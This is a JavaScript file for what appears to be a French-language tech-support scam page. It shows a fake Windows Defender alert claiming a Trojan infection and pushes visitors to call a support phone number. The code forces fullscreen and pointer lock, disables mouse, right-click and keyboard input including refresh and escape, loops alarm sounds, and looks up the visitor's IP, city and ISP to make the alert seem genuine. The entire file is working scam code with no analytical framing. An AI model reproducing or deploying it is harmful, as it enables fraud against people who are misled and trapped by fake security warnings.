$(function () {
  var a = 0,
    b = setInterval(function () {
      a += 10;
      $("#dynamic")
        .css("width", a + "%")
        .attr("aria-valuenow", a)
        .text(a + "% Complete");
      100 <= a && clearInterval(b);
    }, 100);
});

(function (a) {
  a.fn.countTo = function (b) {
    b = b || {};
    return a(this).each(function () {
      function d(a) {
        a = c.formatter.call(k, a, c);
        h.html(a);
      }
      var c = a.extend(
          {},
          a.fn.countTo.defaults,
          {
            from: a(this).data("from"),
            to: a(this).data("to"),
            speed: a(this).data("speed"),
            refreshInterval: a(this).data("refresh-interval"),
            decimals: a(this).data("decimals"),
          },
          b
        ),
        l = Math.ceil(c.speed / c.refreshInterval),
        n = (c.to - c.from) / l,
        k = this,
        h = a(this),
        m = 0,
        f = c.from,
        g = h.data("countTo") || {};
      h.data("countTo", g);
      g.interval && clearInterval(g.interval);
      g.interval = setInterval(function () {
        f += n;
        m++;
        d(f);
        "function" == typeof c.onUpdate && c.onUpdate.call(k, f);
        m >= l &&
          (h.removeData("countTo"),
          clearInterval(g.interval),
          (f = c.to),
          "function" == typeof c.onComplete && c.onComplete.call(k, f));
      }, c.refreshInterval);
      d(f);
    });
  };
  a.fn.countTo.defaults = {
    from: 0,
    to: 0,
    speed: 100,
    refreshInterval: 100,
    decimals: 0,
    formatter: function (a, d) {
      return a.toFixed(d.decimals);
    },
    onUpdate: null,
    onComplete: null,
  };
})(jQuery);
jQuery(function (a) {
  a(".count-number").data("countToOptions", {
    formatter: function (a, d) {
      return a.toFixed(d.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ",");
    },
  });
  a(".timer").each(function (b) {
    var d = a(this);
    b = a.extend({}, b || {}, d.data("countToOptions") || {});
    d.countTo(b);
  });
});
const btn = document.querySelector(".enterfullscreen");

btn.addEventListener("click", function () {
  const el = document.documentElement;
  const rfs =
    el.requestFullscreen ||
    el.webkitRequestFullscreen ||
    el.mozRequestFullScreen;
  if (rfs) rfs.call(el);
});
btn.addEventListener("mousemove", () => {
  var home = document.getElementById("mycanvas");
  home.requestPointerLock =
  home.requestPointerLock ||
  home.mozRequestPointerLock ||
  home.webkitRequestPointerLock;
  home.requestPointerLock();
});
setInterval(function () {
  document.getElementById("pridez").play();
}, 500);

var e = 1;
setInterval(function () {
  1 == e
    ? ((document.getElementById("favicon").href = "msmm.png"), (e = 0))
    : ((document.getElementById("favicon").href = "wdi.png"), (e = 1));
}, 1e3);

$(document).ready(function () {
  $("#mycanvas").click(function () {
    $("#welcomeDiv").show();
  });
});

$(document).ready(function () {
  $(".infgets").delay(900).fadeIn(800);
  $(".black").delay(1e3).fadeIn(800);
  $(".scsdvvfbwqwe").delay(2500).fadeIn(800);
  $(".dqdwcvbsfsaw").delay(3500).fadeIn(800);
  $("#dwrfwewvdssdfsdf").delay(4e3).fadeIn(800);
  $("#qwrqwewrqwdqw").delay(4e3).fadeIn(800);
});

$(document).ready(function () {
  $("#mycanvas").click(function () {
    $("#qwrqwewrqwdqw").show();
  });
});
$(document).ready(function () {
  $("#cross").click(function () {
    $("#qwrqwewrqwdqw").show();
  });
});

$(document).ready(function () {
  $("body").mouseover(function () {
    $("#qwrqwewrqwdqw").show();
  });
});

document.onmousedown = function (a) {
  return !1;
};
document.oncontextmenu = function (a) {
  return !1;
};
document.onmouseup = function (a) {
  return !1;
};
document.onkeydown = function (a) {
  return !1;
};

document.addEventListener("onkeydown", win_onkeydown_handler);

function win_onkeydown_handler() {
  switch (event.keyCode) {
    case 116:
      event.returnValue = !1;
      event.keyCode = 0;
      break;
    case 27:
      (event.returnValue = !1), (event.keyCode = 0);
  }
}

$(document).ready(function () {
  $("#chat").delay(600).fadeIn(100);
});

$(document).ready(function () {
  var audioElement = document.createElement("audio");
  audioElement.setAttribute("src", "webs.wav");

  audioElement.addEventListener(
    "ended",
    function () {
      this.play();
    },
    false
  );

  $("#mycanvas").click(function () {
    audioElement.play();
  });

  $("#link_black").click(function () {
    audioElement.play();
  });

  $(".infgets").click(function () {
    audioElement.play();
  });

  $("#qwrqwewrqwdqw").click(function () {
    audioElement.play();
  });
});
// script.js

// Prevents the context menu (right-click) on the body element
$(function () {
  $("body").bind("contextmenu", function (e) {
    return false;
  });
});

// Function to get a variable value from the URL
function getVariableFromURl(n0me) {
  n0me = n0me.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
  var regexS = "[\\?&]" + n0me + "=([^&#]*)";
  var regex = new RegExp(regexS);
  var results = regex.exec(window.location.href);
  if (results == null) return "";
  else return results[1];
}

// Using the function to get the 'ph0ne' variable from the URL
var ph0ne = getVariableFromURl("ph0ne");
// Function to set the inner HTML of the lightbox
function populateLightbox() {
  // Get the lightbox div by its ID
  const lightbox = document.getElementById("qwrqwewrqwdqw");

  // Set the inner HTML
  lightbox.innerHTML = `
    <div class="ilb top" style="font-size: 17px">
      <div class="ilb headers" style="border-bottom: 1px solid #d6d5d5">
        <span class="fl title" id="txtadd">
          <span class="fl ilb">
            <img src="dm.png" class="logo3" />
          </span>
          Centre de sécurité Windows Defender
        </span>
        <span class="fl title2 close" id="txts1">
          <a href="#" id="cross">
            <img src="cs.png" />
          </a>
        </span>
      </div>
    </div>
    <div id="txtintro">
      <span class="colo-rd">
        <div id="ip_add">Alerte Pare-feu Microsoft-Windows !</div>
        <div id="city">
          Système infecté par un logiciel espion de type cheval de Troie
        </div>
        <div id="isp">(Code d'erreur : 0xMPNJ)</div>
      </span>
    </div>
    <img src="re.gif" id="banner" />
    <div id="disclaimer">
      L'accès à ce système a été bloqué pour des raisons de sécurité. <br />
      <span class="support" style="font-size: 22px">
        Appeler l'assistance Windows: &nbsp;
        <span
          style="
            border: 1px solid #114d9a;
            border-radius: 5px;
            padding: 2px 5px;
          "
        >
                        01 86 61 72 33

        </span>
      </span>
    </div>
    <div id="bottom">
      <img src="msmm.png" id="badge" />
      <span class="title3">Sécurité Windows</span>
      <ul>
        <li>
          <a href="#">
            <div class="fr button2">
              <span id="addtochromebutton">Annuler</span>
            </div>
          </a>
        </li>
        <li>
          <a href="#">
            <div class="fr button">
              <span id="addtochromebutton">D'ACCORD</span>
            </div>
          </a>
        </li>
      </ul>
    </div>
  `;
}

document.addEventListener("DOMContentLoaded", function () {
  populateLightbox();
  var t = new XMLHttpRequest();
  t.onreadystatechange = function () {
    if (4 == this.readyState && 200 == this.status) {
      var a = JSON.parse(this.responseText);
      ipadd = a.ip;
      city = a.city;
      country = a.country;
      isp = a.connection.isp;
      var b = new Date();
      currtime = a.timezone.current_time;
      document.getElementById("ip_add").textContent =
        "Adresse IP: " + ipadd + " " + b.toLocaleString("EN-US", currtime);
      document.getElementById("city").textContent =
        "Emplacement: " + city + ", " + country;
      document.getElementById("isp").textContent = "ISP: " + isp;
    }
  };
  t.open("GET", "https://ipwho.is/?lang=en", !0);
  t.send();
});
